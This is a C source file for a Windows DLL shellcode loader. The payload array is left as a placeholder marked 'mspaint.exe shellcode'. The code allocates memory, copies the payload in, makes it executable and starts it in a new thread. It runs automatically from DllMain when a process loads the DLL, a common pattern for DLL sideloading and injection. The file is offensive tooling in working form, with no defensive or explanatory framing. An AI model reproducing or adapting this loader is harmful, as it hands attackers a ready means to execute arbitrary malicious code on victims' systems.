
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// mspaint.exe shellcode

unsigned char shellcodePayload[X] = { // X reprsent the size of your payload
    // [shellcode_here]
};

unsigned int lengthOfshellcodePayload = X;

extern __declspec(dllexport) int Go(void);
int _shellcodeRunner(void) {
    
	void * alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
    DWORD oldprotect = 0;

	alloc_mem = VirtualAlloc(0, lengthOfshellcodePayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(alloc_mem, shellcodePayload, lengthOfshellcodePayload);
	retval = VirtualProtect(alloc_mem, lengthOfshellcodePayload, PAGE_EXECUTE_READ, &oldprotect);

	if ( retval != 0 ) {
        threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
        WaitForSingleObject(threadHandle, 0);
	}
	return 0;
}


BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD reasonForCall, LPVOID lpReserved ) {
	switch ( reasonForCall ) {
			case DLL_PROCESS_ATTACH:
                _shellcodeRunner();
                break;
			case DLL_THREAD_ATTACH:
                break;
			case DLL_THREAD_DETACH:
                break;
			case DLL_PROCESS_DETACH:
                break;
			}
	return TRUE;
}
